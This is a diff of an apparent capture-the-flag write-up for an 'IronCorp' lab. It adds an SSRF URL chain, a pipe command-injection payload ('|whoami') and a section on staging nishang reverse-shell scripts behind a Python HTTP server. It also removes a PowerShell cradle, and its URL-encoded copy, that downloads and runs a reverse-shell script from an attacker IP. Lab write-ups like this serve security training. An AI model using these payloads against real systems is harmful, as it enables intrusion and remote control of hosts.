@@ -413,12 +413,55 @@ TargetIP ironcorp.me admin.ironcorp.me internal.ironcorp.me
 
 <p>
  
-- http://internal.ironcorp.me:11025/name.php?name=hi</p>
+- http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=hi</p>
 
 <img width="1245" height="340" alt="image" src="https://github.com/user-attachments/assets/2a30456e-3b84-4a54-a88f-8717b2c96d9d" />
 
+<br>
 
+<img width="1220" height="278" alt="image" src="https://github.com/user-attachments/assets/076d2762-3b84-46c9-9c15-94dec7d8b43b" />
 
+<p>
+ 
+- http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=hi|whoami</p>
+
+<img width="1214" height="248" alt="image" src="https://github.com/user-attachments/assets/9fe97888-e6ca-4e22-91ac-269ac63e1c86" />
+
+<br>
+<h3>Reverse Shell</h3>
+
+```bash
+:~/IronCorp# git clone https://github.com/samratashok/nishang.git
+```
+
+```bash
+:~/IronCorp# cd nishang
+```
+
+```bash
+~/IronCorp/nishang# ls
+ActiveDirectory  Bypass         DISCLAIMER.txt  Gather   MITM          powerpreter  Scan
+Antak-WebShell   CHANGELOG.txt  Escalation      LICENSE  nishang.psm1  Prasadhak    Shells
+Backdoors        Client         Execution       Misc     Pivot         README.md    Utility
+```
+
+```bash
+:~/IronCorp/nishang# cd Shells
+```
+
+```bash
+:~/IronCorp/nishang/Shells# ls
+Invoke-ConPtyShell.ps1  Invoke-PoshRatHttp.ps1     Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellUdpOneLine.ps1  Invoke-PsGcatAgent.ps1
+Invoke-JSRatRegsvr.ps1  Invoke-PoshRatHttps.ps1    Invoke-PowerShellTcpOneLine.ps1      Invoke-PowerShellUdp.ps1         Invoke-PsGcat.ps1
+Invoke-JSRatRundll.ps1  Invoke-PowerShellIcmp.ps1  Invoke-PowerShellTcp.ps1             Invoke-PowerShellWmi.ps1         Remove-PoshRat.ps1
+```
+
+<br>
+
+```bash
+:~/IronCorp/nishang/Shells# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
 
 <h3>ironcorp.me:8080/login.html</h3>
 
@@ -551,10 +594,5 @@ Invoke-JSRatRundll.ps1  Invoke-PowerShellIcmp.ps1  Invoke-PowerShellTcp.ps1     
 :~/IronCorp/nishang/Shells# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
-
-powershell.exe -c iex(new-object net.webclient).downloadstring(http://10.10.210.152:8000/Invoke-PowerShellTcp.ps1')
-%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%31%38%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%31%25%33%30%25%32%65%25%33%32%25%33%31%25%33%30%25%32%65%25%33%31%25%33%35%25%33%32%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39
-
-http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=Equinox
 
 
